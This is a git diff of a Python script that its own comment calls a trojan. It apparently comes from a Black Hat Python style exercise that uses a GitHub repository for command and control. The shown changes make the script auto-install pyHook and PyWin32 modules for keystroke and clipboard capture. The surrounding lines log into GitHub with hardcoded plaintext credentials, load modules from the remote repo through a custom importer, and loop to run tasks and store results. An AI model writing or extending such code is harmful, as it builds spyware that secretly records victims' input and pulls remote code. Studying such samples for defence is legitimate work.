@@ -20,14 +20,15 @@ task_queue = Queue.Queue()#task queue is represented by a que
 
 
 #functions:
-def install_and_import(package,toimport):
+def install_and_import(package,toimport):#installed wheel files and imports the relevant thing
     import importlib
     try:
         importlib.import_module(package)
     except ImportError:
         pip.main(['install', package])
     finally:
-        globals()[package] = importlib.import_module(toimport)
+        for x in toimport:
+            globals()[package] = importlib.import_module(x)
 def connect_to_github():#log into github
     gh = login(username="haxxx42",password="yotam1709")#details for login
     repo = gh.repository("haxxx42","chapter7")#name of repository
@@ -101,8 +102,8 @@ def module_runner(module):
     store_module_result(result)#store the module resualt
     return#end function
     # main trojan loop
-install_and_import("pyHook","pyHook")#cant make modules import out of github
-install_and_import("PyWin32","pythoncom")#so installing them manualy with pip
+install_and_import("pyHook",["pyHook"])#cant make modules import out of github
+install_and_import("PyWin32",["pythoncom","win32clipboard"])#so installing them manualy with pip
 sys.meta_path = [GitImporter()]#add my custom importer into path
 while True:#always be active
     if task_queue.empty():#if there are no tasks in task que
